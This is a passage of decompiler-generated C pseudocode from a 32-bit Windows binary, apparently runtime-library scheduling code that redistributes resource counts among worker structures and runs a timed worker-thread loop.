    v28 = 0;
    if ( !v6 )
      break;
    do
    {
      v9 = *(_DWORD **)(v7[23] + 4 * v8);
      if ( v9[1] )
      {
        if ( v9[10] > v9[11] )
        {
          v28 = 1;
          if ( sub_44CAF0(v7, &a3, &a4, v9, a6) )
            --a2;
        }
      }
      ++v8;
    }
    while ( v8 < v6 );
  }
  while ( v28 );
  v10 = a2;
  if ( a2 )
  {
    v11 = 0;
    v23 = 0;
    if ( v6 )
    {
      v25 = v7[23];
      while ( 1 )
      {
        v12 = v11 + 1;
        v27 = v11;
        v26 = v11 + 1;
        v13 = v11 + 1;
        if ( v11 + 1 < v6 )
        {
          v14 = 4 * v11;
          do
          {
            if ( *(_DWORD *)(*(_DWORD *)(v25 + 4 * v13) + 4) <= *(_DWORD *)(*(_DWORD *)(v14 + v25) + 4) )
            {
              v15 = v27;
            }
            else
            {
              v15 = v13;
              v27 = v13;
              v14 = 4 * v13;
            }
            ++v13;
          }
          while ( v13 < v6 );
          v11 = v23;
          v7 = this;
          if ( v23 != v15 )
          {
            v16 = this[23];
            v17 = *(_DWORD *)(v16 + 4 * v23);
            *(_DWORD *)(v16 + 4 * v23) = *(_DWORD *)(v16 + 4 * v15);
            *(_DWORD *)(this[23] + 4 * v27) = v17;
          }
          v12 = v26;
        }
        v25 = v7[23];
        if ( !*(_DWORD *)(*(_DWORD *)(v25 + 4 * v11) + 4) )
          break;
        v11 = v12;
        v23 = v12;
        if ( v12 >= v6 )
          goto LABEL_25;
      }
      v6 = v11;
LABEL_25:
      v10 = a2;
    }
    v18 = v6;
    v24 = v6;
    do
    {
      v19 = 0;
      if ( v18 )
      {
        do
        {
          v20 = *(_DWORD *)(v7[23] + 4 * v19);
          v22 = v20;
          if ( *(_DWORD *)(v20 + 4) )
          {
            v10 = a2 - sub_44C695(v7, &a3, &a4, v20, v6, a6);
            a2 = v10;
            if ( !*(_DWORD *)(v22 + 4) )
              --v6;
          }
          v18 = v24;
          ++v19;
        }
        while ( v19 < v24 );
      }
    }
    while ( v10 );
  }
}

//----- (0044BFC7) --------------------------------------------------------
void __thiscall sub_44BFC7(_DWORD *this, unsigned int a2, unsigned int a3)
{
  unsigned int v3; // ebx
  _DWORD *v4; // edx
  int v5; // esi
  unsigned int v6; // edi
  _DWORD *v7; // edi
  unsigned int v8; // ecx
  int v9; // edi
  unsigned int v10; // ecx
  unsigned int v11; // edx
  int v12; // ebx
  unsigned int v13; // eax
  int v14; // ecx
  int v15; // edx
  int v16; // eax
  int v17; // edi
  int v18; // eax
  unsigned int v19; // eax
  int v20; // [esp+Ch] [ebp-1Ch]
  int v21; // [esp+10h] [ebp-18h]
  int v22; // [esp+10h] [ebp-18h]
  unsigned int v23; // [esp+10h] [ebp-18h]
  int v24; // [esp+14h] [ebp-14h]
  unsigned int v25; // [esp+18h] [ebp-10h]
  unsigned int v26; // [esp+18h] [ebp-10h]
  int v27; // [esp+1Ch] [ebp-Ch]
  unsigned int v28; // [esp+1Ch] [ebp-Ch]
  char v30; // [esp+27h] [ebp-1h]

  v3 = a2;
  v4 = this;
  v5 = a3;
  do
  {
    v6 = 0;
    v30 = 0;
    v25 = 0;
    if ( !a3 )
      break;
    do
    {
      if ( !v3 )
        break;
      v7 = *(_DWORD **)(v4[23] + 4 * v6);
      if ( v7[1] )
      {
        v8 = v7[11];
        if ( v7[10] > v8 )
        {
          v30 = 1;
          v27 = *(_DWORD *)(*(_DWORD *)(v7[4] + 20) + 4 * v8);
          v21 = *(_DWORD *)(v7[4] + 16) + 52 * v27;
          if ( *(_DWORD *)(40 * v27 + v4[18] + 28) )
          {
            sub_44C39C(v4, (_DWORD *)v7[4], v27, 1, 1);
            if ( *(_DWORD *)(v21 + 28) == *(_DWORD *)(v21 + 4) )
              ++v7[11];
            --v7[1];
            --v3;
            v4 = this;
          }
          else
          {
            ++v7[11];
          }
        }
      }
      v6 = v25 + 1;
      v25 = v6;
    }
    while ( v6 < a3 );
    a2 = v3;
  }
  while ( v30 );
  if ( v3 )
  {
    v9 = 0;
    v22 = 0;
    if ( a3 )
    {
      v24 = v4[23];
      while ( 1 )
      {
        v10 = v9 + 1;
        v28 = v9;
        v26 = v9 + 1;
        if ( v9 + 1 < a3 )
        {
          v11 = v9 + 1;
          v12 = 4 * v9;
          do
          {
            if ( *(_DWORD *)(*(_DWORD *)(v24 + 4 * v11) + 4) <= *(_DWORD *)(*(_DWORD *)(v12 + v24) + 4) )
            {
              v13 = v28;
            }
            else
            {
              v13 = v11;
              v28 = v11;
              v12 = 4 * v11;
            }
            ++v11;
          }
          while ( v11 < a3 );
          v9 = v22;
          v3 = a2;
          v4 = this;
          if ( v22 != v13 )
          {
            v14 = this[23];
            v15 = *(_DWORD *)(v14 + 4 * v22);
            *(_DWORD *)(v14 + 4 * v22) = *(_DWORD *)(v14 + 4 * v13);
            *(_DWORD *)(this[23] + 4 * v28) = v15;
            v4 = this;
          }
          v10 = v26;
        }
        v24 = v4[23];
        if ( !*(_DWORD *)(*(_DWORD *)(v24 + 4 * v9) + 4) )
          break;
        v9 = v10;
        v22 = v10;
        if ( v10 >= a3 )
          goto LABEL_29;
      }
      v5 = v9;
    }
LABEL_29:
    v16 = v5;
    v23 = v5;
    while ( 1 )
    {
      v17 = 0;
      if ( v16 )
        break;
LABEL_36:
      if ( !v3 )
        return;
    }
    while ( v3 )
    {
      v18 = *(_DWORD *)(v4[23] + 4 * v17);
      v20 = v18;
      if ( *(_DWORD *)(v18 + 4) )
      {
        v19 = sub_44C9D6(v4, v3, v18, v5);
        v4 = this;
        v3 -= v19;
        if ( !*(_DWORD *)(v20 + 4) )
          --v5;
      }
      v16 = v23;
      if ( ++v17 >= v23 )
        goto LABEL_36;
    }
  }
}

//----- (0044C15A) --------------------------------------------------------
int __thiscall sub_44C15A(int *this)
{
  unsigned int v2; // edx
  unsigned int v3; // ebx
  _DWORD *v4; // ecx
  int v5; // esi
  unsigned int v6; // edx
  unsigned int v7; // eax
  unsigned int v8; // esi
  int v9; // eax
  unsigned int v10; // eax
  unsigned int v11; // ebx
  unsigned int v12; // edx
  int v13; // esi
  _DWORD *v14; // eax
  unsigned int v15; // esi
  int v16; // edx
  _DWORD *v17; // ecx
  unsigned int v18; // esi
  unsigned int j; // eax
  unsigned int v20; // ecx
  unsigned int v21; // ebx
  unsigned int v22; // edx
  int v23; // esi
  unsigned int v24; // esi
  unsigned int v25; // ecx
  unsigned int v26; // edx
  unsigned int v27; // esi
  unsigned int v28; // eax
  unsigned int v30; // [esp+Ch] [ebp-18h]
  unsigned int i; // [esp+10h] [ebp-14h]
  unsigned int v32; // [esp+14h] [ebp-10h]
  unsigned int v33; // [esp+14h] [ebp-10h]
  unsigned int v34; // [esp+18h] [ebp-Ch]
  int v35; // [esp+1Ch] [ebp-8h]
  unsigned int v36; // [esp+1Ch] [ebp-8h]
  unsigned int v37; // [esp+20h] [ebp-4h]

  sub_44D840(this);
  sub_44D95C(this);
  v34 = 0;
  v2 = 0;
  v3 = 0;
  for ( i = 0; v3 < this[2]; ++v3 )
  {
    v4 = *(_DWORD **)(this[21] + 4 * v3);
    if ( *(_DWORD *)(v4[4] + 160) > v4[9] )
    {
      *(_DWORD *)(this[22] + 4 * v2) = v4;
      v5 = v4[4];
      i = v2 + 1;
      v6 = *(_DWORD *)(v5 + 160) - v4[9];
      v34 += v6;
      if ( v4[6] < v6 )
        v6 = v4[6];
      v4[10] = v6;
      v7 = *(_DWORD *)(v5 + 160) - v4[9] - v6;
      v8 = *(_DWORD *)(v5 + 168) - v4[6];
      if ( v8 >= v7 )
        v8 = v7;
      v9 = v4[4];
      v4[11] = v8;
      v10 = *(_DWORD *)(v9 + 160) - v4[9] - v8 - v6;
      v2 = i;
      v4[12] = v10;
    }
  }
  v11 = 0;
  v12 = 0;
  this[8] = 0;
  v37 = 0;
  v32 = 0;
  if ( this[6] )
  {
    v13 = 0;
    v35 = 0;
    do
    {
      v14 = (_DWORD *)(v13 + this[18]);
      if ( v14[1] )
      {
        v15 = 0;
        v16 = 0;
        do
        {
          v17 = (_DWORD *)(v16 + v14[8]);
          if ( v17[4] )
          {
            v11 = v37;
            if ( v17[4] == v17[7] )
            {
              *v17 = 6;
              ++v14[7];
              ++this[8];
            }
          }
          else
          {
            *v17 = 2;
            ++v14[2];
            v11 = ++v37;
          }
          ++v15;
          v16 += 36;
        }
        while ( v15 < v14[1] );
        v12 = v32;
        v13 = v35;
      }
      ++v12;
      v13 += 40;
      v32 = v12;
      v35 = v13;
    }
    while ( v12 < this[6] );
  }
  this[9] = 0;
  v18 = v11 + v34;
  v36 = v11 + v34;
  for ( j = 0; (v18 || this[8]) && j < 2; j = this[9] )
  {
    if ( j == 1 )
      sub_44D12E(this);
    v20 = 0;
    v21 = 0;
    v22 = 0;
    v33 = 0;
    if ( this[2] )
    {
      do
      {
        v23 = *(_DWORD *)(this[21] + 4 * v22);
        if ( *(_DWORD *)(*(_DWORD *)(v23 + 16) + 160) < *(_DWORD *)(v23 + 36) )
        {
          *(_DWORD *)(this[23] + 4 * v20) = v23;
          v33 = v20 + 1;
          v21 += *(_DWORD *)(v23 + 36) - *(_DWORD *)(*(_DWORD *)(v23 + 16) + 160);
          ++v20;
        }
        ++v22;
      }
      while ( v22 < this[2] );
      v18 = v36;
      if ( v20 )
      {
        if ( v36 )
        {
          v24 = sub_44B22C(this, v36, v21, v20);
          v30 = sub_44DA59(this, v33);
          v25 = 0;
          if ( v37 >= v24 )
          {
            v26 = v24;
            v37 -= v24;
          }
          else
          {
            v26 = v37;
            v25 = v24 - v37;
            v37 = 0;
            if ( v25 >= v34 )
              v25 = v34;
            v34 -= v25;
          }
          sub_44BE8A(this, v24, v26, v25, v30, i);
          v36 -= v24;
          v21 -= v24;
          v20 = v33;
          v18 = v36;
        }
        if ( v21 )
        {
          if ( this[8] )
          {
            v27 = sub_44B22C(this, this[8], v21, v20);
            v28 = sub_44DA59(this, v33);
            sub_44BFC7(this, v27, v28);
            this[8] -= v27;
            v18 = v36;
          }
        }
      }
    }
    ++this[9];
  }
  return sub_44E61F(this);
}

//----- (0044C39C) --------------------------------------------------------
void __thiscall sub_44C39C(_DWORD *this, _DWORD *a2, int a3, int a4, char a5)
{
  int v5; // edx
  int v6; // edi
  _DWORD *v7; // esi
  int i; // ecx
  _DWORD *v9; // eax
  int v10; // [esp+Ch] [ebp-4h]

  v5 = a3;
  v6 = 0;
  v7 = (_DWORD *)(this[18] + 40 * a3);
  for ( i = 0; ; i += 36 )
  {
    v9 = (_DWORD *)(i + v7[8]);
    v10 = i;
    if ( *v9 == 2 && !a5 )
      break;
    if ( *v9 == 6 && a5 )
      break;
LABEL_11:
    ++v6;
  }
  ++v9[4];
  *v9 = 0;
  if ( a5 )
    --v7[7];
  else
    --v7[2];
  sub_455567(a2, a2[4] + 52 * v5, v6, a5);
  if ( --a4 )
  {
    i = v10;
    v5 = a3;
    goto LABEL_11;
  }
}

//----- (0044C409) --------------------------------------------------------
void __thiscall sub_44C409(_DWORD *this, _DWORD *a2, _DWORD *a3, int a4, unsigned int a5)
{
  _DWORD *v5; // ebx
  unsigned int v6; // edx
  unsigned int v7; // esi
  unsigned int v8; // edi
  unsigned int v9; // ebx
  unsigned int v10; // esi
  unsigned int v11; // esi
  int v12; // ecx
  int v13; // edx
  char v14; // al
  _DWORD *v15; // [esp+10h] [ebp-2Ch]
  int v16; // [esp+14h] [ebp-28h]
  char v17; // [esp+1Ch] [ebp-20h]
  int v19; // [esp+24h] [ebp-18h]
  int v20; // [esp+28h] [ebp-14h]
  int v21; // [esp+2Ch] [ebp-10h]
  int v22; // [esp+30h] [ebp-Ch]
  unsigned int v23; // [esp+34h] [ebp-8h]
  char v24; // [esp+3Ah] [ebp-2h]
  char v25; // [esp+3Bh] [ebp-1h]

  v5 = (_DWORD *)(52 * a4 + *(_DWORD *)(a2[4] + 16));
  v15 = (_DWORD *)a2[4];
  v22 = (int)v5;
  v6 = v5[11];
  if ( a5 >= v6 )
  {
    v7 = v5[11];
    v23 = v7;
  }
  else
  {
    v7 = a5;
    v23 = a5;
  }
  v8 = a5 - v7;
  if ( a5 - v7 >= v5[8] - v6 )
    v8 = v5[8] - v6;
  v9 = v5[10] - v6;
  v10 = a5 - v8 - v23;
  if ( v10 < v9 )
    v9 = a5 - v8 - v23;
  v11 = v10 - v9;
  v21 = 0;
  v19 = 0;
  v20 = 0;
  v12 = v22;
  while ( 1 )
  {
    v13 = v20 + *(_DWORD *)(v12 + 48);
    v16 = v13;
    if ( *(_DWORD *)v13 == 4 && !*(_DWORD *)(v13 + 40) )
      break;
LABEL_31:
    ++v21;
    v20 += 52;
    v19 += 36;
  }
  v24 = *(_BYTE *)(v13 + 49);
  if ( v24 )
  {
    v25 = *(_BYTE *)(v13 + 48);
    if ( v25 && v23 )
    {
      --v23;
    }
    else
    {
      if ( !v8 )
        goto LABEL_31;
      --v8;
    }
  }
  else
  {
    v25 = *(_BYTE *)(v13 + 48);
    v12 = v22;
    if ( v25 && v9 )
    {
      --v9;
    }
    else
    {
      if ( !v11 )
        goto LABEL_31;
      --v11;
    }
  }
  v14 = v25;
  if ( v25 )
  {
    sub_44ECF1(
      this,
      v22,
      v13,
      (_DWORD *)(40 * a4 + this[18]),
      (_DWORD *)(v19 + *(_DWORD *)(40 * a4 + this[18] + 32)),
      a2);
    v24 = *(_BYTE *)(v16 + 49);
    v14 = v25;
  }
  v17 = 0;
  if ( v24 )
  {
    v17 = 1;
    if ( v14 )
      --a2[10];
    else
      --a2[11];
  }
  else
  {
    --a2[12];
  }
  sub_4561E2(v15, v22, v21);
  sub_455567(a3, 52 * a4 + a3[4], v21, v17);
  if ( --a5 )
  {
    v12 = v22;
    goto LABEL_31;
  }
}

//----- (0044C57C) --------------------------------------------------------
int __stdcall StartAddress(LPVOID lpThreadParameter)
{
  sub_44C595((int)lpThreadParameter);
  sub_44ABBF(0);
  return 0;
}

//----- (0044C595) --------------------------------------------------------
void __thiscall sub_44C595(int this)
{
  DWORD v2; // ebx
  struct _RTL_CRITICAL_SECTION *i; // esi
  int v4; // eax
  unsigned int v5; // esi
  DWORD v6; // [esp+14h] [ebp-18h]
  int TickCount64; // [esp+1Ch] [ebp-10h]

  v2 = 100;
  TickCount64 = j____crtGetTickCount64() - 500;
  if ( *(_DWORD *)(this + 40) != 2 )
  {
    for ( i = (struct _RTL_CRITICAL_SECTION *)(this + 44); ; i = (struct _RTL_CRITICAL_SECTION *)(this + 44) )
    {
      v6 = WaitForSingleObjectEx(*(HANDLE *)(this + 80), v2, 0);
      sub_44A1E8(i);
      v4 = *(_DWORD *)(this + 40);
      if ( v4 )
      {
        if ( v4 != 1 )
          goto LABEL_17;
        if ( v6 == 258 )
        {
          sub_44C15A((int *)this);
LABEL_10:
          if ( *(_DWORD *)(this + 16) )
            sub_44E93B((_DWORD *)this, 0);
          goto LABEL_12;
        }
        v5 = j____crtGetTickCount64() - TickCount64;
        if ( v5 > 0x64 )
        {
          if ( v5 <= 0x82 )
            goto LABEL_10;
          sub_44BC85((_DWORD *)this);
LABEL_12:
          TickCount64 = j____crtGetTickCount64();
          v2 = 100;
          goto LABEL_17;
        }
        if ( *(_DWORD *)(this + 16) )
          sub_44E93B((_DWORD *)this, 0);
        v2 = 100 - v5;
      }
      else
      {
        v2 = sub_44BCEA((_DWORD *)this) ? -1 : 100;
      }
LABEL_17:
      sub_44A32E((LPCRITICAL_SECTION)(this + 44));
      if ( *(_DWORD *)(this + 40) == 2 )
        return;
    }
  }
}
// 44A95D: using guessed type __int64 j____crtGetTickCount64(void);

//----- (0044C695) --------------------------------------------------------
unsigned int __thiscall sub_44C695(_DWORD *this, unsigned int *a2, unsigned int *a3, int a4, int a5, unsigned int a6)
{
  int v7; // ecx
  int v8; // esi
  unsigned int v9; // ebx
  unsigned int v10; // eax
  int v11; // eax
  int v12; // edx
  unsigned int v13; // edi
  unsigned int v14; // edx
  unsigned int v15; // eax
  unsigned int *v16; // eax
  unsigned int v17; // esi
  int v18; // ecx
  _DWORD *v19; // esi
  int v20; // edx
  int v21; // edx
  unsigned int v22; // eax
  int v23; // edx
  int v24; // eax
  unsigned int v25; // edx
  unsigned int v26; // eax
  bool v27; // cf
  unsigned int v28; // eax
  bool v29; // zf
  int v30; // edx
  unsigned int v31; // eax
  unsigned int v32; // esi
  unsigned int v33; // eax
  unsigned int v34; // ecx
  unsigned int *v35; // eax
  unsigned int v36; // esi
  _DWORD *v37; // edx
  _DWORD *v38; // ecx
  int v39; // eax
  int v40; // ebx
  unsigned int v41; // ecx
  unsigned int v42; // eax
  unsigned int v43; // eax
  unsigned int v44; // ecx
  int v45; // edx
  int v46; // ecx
  char v47; // al
  _DWORD *v49; // [esp+Ch] [ebp-50h]
  unsigned int v50; // [esp+10h] [ebp-4Ch]
  int v51; // [esp+14h] [ebp-48h]
  int v52; // [esp+18h] [ebp-44h]
  unsigned int v53; // [esp+1Ch] [ebp-40h]
  unsigned int v54; // [esp+20h] [ebp-3Ch]
  int v55; // [esp+24h] [ebp-38h]
  unsigned int v56; // [esp+24h] [ebp-38h]
  unsigned int v57; // [esp+24h] [ebp-38h]
  int v58; // [esp+28h] [ebp-34h]
  int v59; // [esp+2Ch] [ebp-30h]
  int v60; // [esp+2Ch] [ebp-30h]
  unsigned int v61; // [esp+30h] [ebp-2Ch]
  unsigned int v62; // [esp+34h] [ebp-28h]
  unsigned int v63; // [esp+38h] [ebp-24h]
  int v64; // [esp+3Ch] [ebp-20h]
  int v65; // [esp+40h] [ebp-1Ch]
  unsigned int v66; // [esp+44h] [ebp-18h]
  unsigned int v67; // [esp+48h] [ebp-14h]
  int v68; // [esp+4Ch] [ebp-10h]
  _DWORD *v69; // [esp+50h] [ebp-Ch]
  int v70; // [esp+54h] [ebp-8h]
  char v71; // [esp+5Bh] [ebp-1h]

  v7 = a4;
  v69 = this;
  v49 = *(_DWORD **)(a4 + 16);
  v8 = v49[5];
  v65 = v49[4];
  v9 = 0;
  v68 = v8;
  v54 = 0;
  if ( a5 == 1 )
    v71 = 0;
  else
    v71 = *(_BYTE *)(a4 + 32);
  v10 = *(_DWORD *)(a4 + 44);
  v53 = 0;
  v58 = -1;
  v66 = 0;
  v61 = 0;
  v59 = v10;
  v50 = this[6];
  if ( v10 >= v50 )
    goto LABEL_79;
  do
  {
    v11 = *(_DWORD *)(v8 + 4 * v10);
    v12 = 52 * v11;
    v55 = 52 * v11;
    v13 = v66;
    if ( *(_DWORD *)(52 * v11 + v65 + 28) )
      goto LABEL_40;
    v62 = *(_DWORD *)(v7 + 4);
    if ( v62 >= *(_DWORD *)(v12 + v65 + 4) )
      v62 = *(_DWORD *)(v12 + v65 + 4);
    v14 = 0;
    v13 = v66;
    v63 = 0;
    v70 = 0;
    if ( *a2 )
    {
      v15 = *(_DWORD *)(40 * v11 + v69[18] + 8);
      if ( v15 )
      {
        if ( *a2 < v15 )
          v15 = *a2;
        v63 = v15;
        v14 = 1;
        v70 = 1;
      }
      v7 = a4;
    }
    v16 = a3;
    v17 = 0;
    v67 = 0;
    if ( *a3 )
    {
      v64 = 0;
      if ( a6 )
      {
        v18 = v55;
        while ( 1 )
        {
          if ( v17 >= *v16 )
          {
LABEL_33:
            v13 = v66;
            v9 = 0;
            v7 = a4;
            break;
          }
          v19 = *(_DWORD **)(v69[22] + 4 * v64);
          v20 = v19[4];
          if ( *(_DWORD *)(v20 + 160) > v19[9]
            && (v21 = *(_DWORD *)(v20 + 16), (v52 = *(_DWORD *)(v18 + v21 + 28) - *(_DWORD *)(v18 + v21 + 36)) != 0) )
          {
            v22 = *(_DWORD *)(v18 + v21 + 44);
            v56 = v19[10];
            if ( v22 < v56 )
              v56 = *(_DWORD *)(v18 + v21 + 44);
            v51 = *(_DWORD *)(v18 + v21 + 32);
            v23 = v51 - v22;
            if ( v51 - v22 >= v19[11] )
              v23 = v19[11];
            v24 = v52 - v51;
            if ( (unsigned int)(v52 - v51) >= v19[12] )
              v24 = v19[12];
            v17 = v67;
            v25 = v56 + v24 + v23;
            if ( v25 )
            {
              v26 = *a3 - v67;
              if ( v26 >= v25 )
                v26 = v25;
              v17 = v26 + v67;
              v14 = v70 + 1;
              v67 += v26;
              ++v70;
              goto LABEL_32;
            }
          }
          else
          {
            v17 = v67;
          }
          v14 = v70;
LABEL_32:
          v27 = ++v64 < a6;
          v16 = a3;
          if ( !v27 )
            goto LABEL_33;
        }
      }
    }
    v28 = v17 + v63;
    if ( v71 )
    {
      v29 = v28 == v62;
LABEL_36:
      if ( !v29 || v14 <= v61 )
        goto LABEL_39;
      goto LABEL_38;
    }
    if ( v13 >= v62 || v28 <= v13 )
    {
      v29 = v28 == v13;
      goto LABEL_36;
    }
LABEL_38:
    v58 = v59;
    v13 = v17 + v63;
    v66 = v17 + v63;
    v61 = v14;
LABEL_39:
    v8 = v49[5];
LABEL_40:
    v10 = v59 + 1;
    v59 = v10;
  }
  while ( v10 < v50 );
  if ( v58 == -1 )
  {
LABEL_79:
    v47 = 0;
    goto LABEL_80;
  }
  v30 = *(_DWORD *)(v8 + 4 * v58);
  v31 = *(_DWORD *)(v7 + 4);
  v60 = v30;
  if ( v31 < v13 )
    v13 = *(_DWORD *)(v7 + 4);
  *(_DWORD *)(v7 + 4) = v31 - v13;
  v53 = v13;
  v32 = *a2;
  if ( *a2 )
  {
    v33 = *(_DWORD *)(40 * v30 + v69[18] + 8);
    if ( v33 )
    {
      v34 = *a2;
      if ( v32 >= v33 )
        v34 = *(_DWORD *)(40 * v30 + v69[18] + 8);
      if ( v34 >= v13 )
      {
        v32 = v13;
      }
      else if ( v32 >= v33 )
      {
        v32 = *(_DWORD *)(40 * v30 + v69[18] + 8);
      }
      sub_44C39C(v69, v49, v30, v32, 0);
      *a2 -= v32;
      v13 -= v32;
    }
  }
  if ( v13 )
  {
    v35 = a3;
    if ( *a3 )
    {
      do
      {
        if ( v9 >= a6 )
          break;
        v36 = *v35;
        if ( !*v35 )
          break;
        v37 = *(_DWORD **)(v69[22] + 4 * v9);
        if ( *(_DWORD *)(v37[4] + 160) <= v37[9] )
          goto LABEL_76;
        v38 = (_DWORD *)(*(_DWORD *)(v37[4] + 16) + 52 * v60);
        v39 = v38[7] - v38[9];
        if ( !v39 )
          goto LABEL_76;
        v57 = v37[10];
        if ( v38[11] < v57 )
          v57 = v38[11];
        v40 = v38[8];
        v41 = v40 - v38[11];
        if ( v41 >= v37[11] )
          v41 = v37[11];
        v42 = v39 - v40;
        if ( v42 >= v37[12] )
          v42 = v37[12];
        v9 = v54;
        v43 = v57 + v41 + v42;
        if ( v43 )
        {
          v44 = v36;
          if ( v36 >= v43 )
            v44 = v43;
          if ( v44 >= v13 )
          {
            v36 = v13;
          }
          else if ( v36 >= v43 )
          {
            v36 = v43;
          }
          sub_44C409(v69, v37, *(_DWORD **)(a4 + 16), v60, v36);
          v35 = a3;
          *a3 -= v36;
          v13 -= v36;
        }
        else
        {
LABEL_76:
          v35 = a3;
        }
        v54 = ++v9;
      }
      while ( v13 );
    }
  }
  v45 = *(_DWORD *)(a4 + 44);
  v46 = *(_DWORD *)(v68 + 4 * v45);
  *(_DWORD *)(v68 + 4 * v45) = *(_DWORD *)(v68 + 4 * v58);
  *(_DWORD *)(v68 + 4 * v58) = v46;
  v7 = a4;
  ++*(_DWORD *)(a4 + 44);
  v47 = 1;
LABEL_80:
  *(_BYTE *)(v7 + 32) = v47;
  return v53;
}

//----- (0044C9D6) --------------------------------------------------------
unsigned int __thiscall sub_44C9D6(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v4; // ebx
  int v5; // eax
  int v6; // edi
  unsigned int v7; // eax
  int v8; // ecx
  unsigned int v9; // eax
  int v10; // edx
  int v11; // ecx
  char v12; // al
  unsigned int v14; // [esp+Ch] [ebp-28h]
  int v15; // [esp+10h] [ebp-24h]
  int v16; // [esp+14h] [ebp-20h]
  int v17; // [esp+18h] [ebp-1Ch]
  unsigned int v18; // [esp+1Ch] [ebp-18h]
  unsigned int v20; // [esp+24h] [ebp-10h]
  int v21; // [esp+28h] [ebp-Ch]
  int v22; // [esp+2Ch] [ebp-8h]
  char v23; // [esp+33h] [ebp-1h]

  v4 = 0;
  v5 = *(_DWORD *)(a3 + 16);
  v6 = *(_DWORD *)(v5 + 20);
  v17 = *(_DWORD *)(v5 + 16);
  if ( a4 == 1 )
    v23 = 0;
  else
    v23 = *(_BYTE *)(a3 + 32);
  v7 = *(_DWORD *)(a3 + 44);
  v22 = -1;
  v20 = 0;
  v21 = v7;
  v14 = this[6];
  v8 = -1;
  if ( v7 >= this[6] )
  {
LABEL_25:
    v12 = 0;
    goto LABEL_26;
  }
  do
  {
    v15 = *(_DWORD *)(v6 + 4 * v7);
    v16 = v17 + 52 * v15;
    if ( *(_DWORD *)(v16 + 28) )
      goto LABEL_16;
    v18 = *(_DWORD *)(a3 + 4);
    if ( v18 >= *(_DWORD *)(v16 + 4) )
      v18 = *(_DWORD *)(v16 + 4);
    v9 = *(_DWORD *)(40 * v15 + this[18] + 28);
    if ( v9 )
    {
      if ( a2 < v9 )
        v9 = a2;
    }
    else
    {
      v9 = 0;
    }
    if ( v23 )
    {
      if ( v9 == v18 )
        goto LABEL_23;
    }
    else if ( v9 > v20 )
    {
LABEL_23:
      v8 = v21;
      v22 = v21;
      v20 = v9;
      if ( v23 )
        goto LABEL_18;
      goto LABEL_15;
    }
    v8 = v22;
LABEL_15:
    v7 = v21;
LABEL_16:
    v21 = ++v7;
  }
  while ( v7 < v14 );
  v9 = v20;
LABEL_18:
  if ( v8 == -1 )
    goto LABEL_25;
  v4 = *(_DWORD *)(a3 + 4);
  if ( v4 >= v9 )
    v4 = v9;
  sub_44C39C(this, *(_DWORD **)(a3 + 16), *(_DWORD *)(v6 + 4 * v8), v4, 1);
  v10 = *(_DWORD *)(a3 + 44);
  *(_DWORD *)(a3 + 4) -= v4;
  v11 = *(_DWORD *)(v6 + 4 * v10);
  *(_DWORD *)(v6 + 4 * v10) = *(_DWORD *)(v6 + 4 * v22);
  *(_DWORD *)(v6 + 4 * v22) = v11;
  ++*(_DWORD *)(a3 + 44);
  v12 = 1;
LABEL_26:
  *(_BYTE *)(a3 + 32) = v12;
  return v4;
}

//----- (0044CAF0) --------------------------------------------------------
char __thiscall sub_44CAF0(_DWORD *this, _DWORD *a2, _DWORD *a3, _DWORD *a4, unsigned int a5)
{
  char v5; // bl
  int v6; // eax
  int v7; // ecx
  _DWORD *v8; // edx
  int v9; // edi
  unsigned int v10; // ecx
  _DWORD *v11; // ecx
  int v12; // edx
  int v14; // [esp+Ch] [ebp-10h]
  unsigned int v15; // [esp+10h] [ebp-Ch]
  int v16; // [esp+14h] [ebp-8h]

  v5 = 0;
  v6 = a4[4];
  v14 = *(_DWORD *)(v6 + 16);
  v7 = *(_DWORD *)(*(_DWORD *)(v6 + 20) + 4 * a4[11]);
  v8 = this;
  v9 = 52 * v7;
  v16 = v7;
  if ( *a2 && *(_DWORD *)(40 * v7 + this[18] + 8) )
  {
    v5 = 1;
    sub_44C39C(this, (_DWORD *)a4[4], v7, 1, 0);
    --*a2;
  }
  else
  {
    if ( !*a3 || (v10 = 0, v15 = 0, !a5) )
    {
LABEL_20:
      ++a4[11];
      return v5;
    }
    while ( !v5 )
    {
      v11 = *(_DWORD **)(v8[22] + 4 * v10);
      if ( *(_DWORD *)(v11[4] + 160) > v11[9] )
      {
        v12 = *(_DWORD *)(v11[4] + 16);
        if ( *(_DWORD *)(v9 + v12 + 44)
          || *(_DWORD *)(v9 + v12 + 32) != *(_DWORD *)(v9 + v12 + 44) && v11[11]
          || *(_DWORD *)(v9 + v12 + 28) != *(_DWORD *)(v9 + v12 + 36) && v11[12] )
        {
          v5 = 1;
          sub_44C409(this, v11, (_DWORD *)a4[4], v16, 1u);
          --*a3;
        }
        v8 = this;
      }
      v10 = v15 + 1;
      v15 = v10;
      if ( v10 >= a5 )
      {
        if ( !v5 )
          goto LABEL_20;
        break;
      }
    }
  }
  if ( *(_DWORD *)(v9 + v14 + 28) == *(_DWORD *)(v9 + v14 + 4) )
    ++a4[11];
  --a4[1];
  return v5;
}

//----- (0044CBF9) --------------------------------------------------------
int __thiscall sub_44CBF9(_DWORD *this, __int16 a2)
{
  unsigned __int16 v2; // si
  unsigned __int16 v3; // dx
  int v4; // ecx
  int result; // eax

  v2 = *(_WORD *)this;
  v3 = 0;
  if ( !*(_WORD *)this )
    return 0;
  v4 = this[1];
  while ( 1 )
  {
    result = v4 + 12 * v3;
    if ( *(_WORD *)(result + 4) == a2 )
      break;
    if ( ++v3 >= v2 )
      return 0;
  }
  return result;
}

//----- (0044CC2D) --------------------------------------------------------
_BYTE *__thiscall sub_44CC2D(_DWORD *this)
{
  _BYTE *result; // eax
  DWORD flOldProtect; // [esp+0h] [ebp-4h] BYREF

  flOldProtect = (DWORD)this;
  if ( dword_500024 >= 3 )
    return (_BYTE *)__crtFlushProcessWriteBuffers(flOldProtect);
  result = (_BYTE *)this[35];
  if ( *result == 1 )
    return (_BYTE *)VirtualProtect(result, 1u, 2u, &flOldProtect);
  return result;
}
// 434819: using guessed type int __cdecl __crtFlushProcessWriteBuffers(_DWORD);
// 500024: using guessed type int dword_500024;

//----- (0044CC5D) --------------------------------------------------------
int __thiscall sub_44CC5D(_DWORD *this)
{
  return this[6];
}

//----- (0044CC61) --------------------------------------------------------
int sub_44CC61()
{
  int result; // eax

  result = dword_500014;
  if ( !dword_500014 )
  {
    sub_44AE22(&dword_500068);
    result = dword_500014;
    if ( !dword_500014 )
    {
      sub_44D376(0);
      result = dword_500014;
    }
    dword_500068 = 0;
  }
  return result;
}
// 500014: using guessed type int dword_500014;
// 500068: using guessed type int dword_500068;

